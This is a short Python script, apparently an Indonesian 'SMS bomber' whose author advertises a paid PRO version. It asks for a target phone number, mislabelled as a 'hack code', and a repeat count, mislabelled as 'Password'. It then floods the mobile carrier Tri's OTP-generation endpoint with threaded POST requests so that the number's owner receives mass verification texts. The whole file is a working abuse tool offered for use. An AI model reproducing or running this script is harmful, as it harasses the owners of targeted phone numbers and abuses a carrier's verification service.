#!/usr/bin/python
# -*- coding: utf-8 -*-
# Coded by TuanTayo
"""
mau beli versi PRO? email : cyber.tuantayo@gmail.com
"""
from multiprocessing.pool import ThreadPool
try:
	import os, time, requests, sys
except ModuleNotFoundError:
	print("\nSepertinya module requests BELUM Di Install")
	print("$ pip install requests\n")
	exit()

banner=("""\033[1;36m
\033[1;32mAFK\033[1;36m
\033[1;31mEmail=>cyber.tuantayo@gmail.com\033[1;36m
\033[1;31mGithub=>https://github.com/TuanTayo
""")

os.system('clear')
print(banner)
no = input("\033[1;37mMasukan Code Hack >\033[1;32m")
tot = int(input("\033[1;37mPassword >\033[1;32m"))
spam = {'msisdn':no}
idk = '200'
def main(arg):
	try:
		r = requests.post('https://registrasi.tri.co.id/daftar/generateOTP?',data = spam)
#		print(r.text)
		if str(idk) in str(r.text):
			print("\033[1;32m[v] SUKSES")
		else:
			print(r.text)
			print("\033[1;31m[x] GAGAL")
	except: pass

jobs = []
for x in range(tot):
    jobs.append(x)
p=ThreadPool(10)
p.map(main,jobs)
